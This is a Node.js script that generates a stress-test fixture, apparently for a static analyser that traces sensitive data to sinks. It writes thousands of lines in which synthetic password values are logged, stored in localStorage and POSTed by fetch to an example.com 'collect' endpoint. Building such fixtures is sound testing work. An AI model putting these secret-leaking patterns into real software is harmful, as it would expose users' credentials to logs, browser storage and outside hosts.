import { mkdirSync, writeFileSync } from "node:fs";
import { resolve } from "node:path";

const sourceCount = Number.parseInt(process.env.SOURCE_COUNT ?? "160", 10);
const repeatsPerSource = Number.parseInt(process.env.REPEATS_PER_SOURCE ?? "160", 10);

if (!Number.isInteger(sourceCount) || sourceCount < 1 || !Number.isInteger(repeatsPerSource) || repeatsPerSource < 1) {
  throw new Error("SOURCE_COUNT and REPEATS_PER_SOURCE must be positive integers.");
}

const lines = [
  "// Generated by scripts/generate-stress-fixture.mjs. Do not edit manually.",
  "// This file deliberately creates many sensitive-source-to-sink paths.",
  "const logger = { info: (value) => console.log(value) };",
  ""
];

for (let source = 0; source < sourceCount; source += 1) {
  lines.push(`const accountPassword${source} = \"synthetic-secret-${source}\";`);
}

for (let source = 0; source < sourceCount; source += 1) {
  for (let repeat = 0; repeat < repeatsPerSource; repeat += 1) {
    const value = `accountPassword${source}`;
    lines.push(`console.log(${value});`);
    lines.push(`logger.info(${value});`);
    lines.push(`fetch(\"https://example.com/collect/${repeat}\", { method: \"POST\", body: ${value} });`);
    lines.push(`localStorage.setItem(\"password-${repeat}\", ${value});`);
  }
}

const outputDirectory = resolve("src");
mkdirSync(outputDirectory, { recursive: true });
const outputPath = resolve(outputDirectory, "stress.js");
writeFileSync(outputPath, `${lines.join("\n")}\n`);

console.log(
  `Wrote ${outputPath} with ${sourceCount * repeatsPerSource * 4} sink calls ` +
    `(${sourceCount} sources × ${repeatsPerSource} repetitions × 4 sink styles).`
);
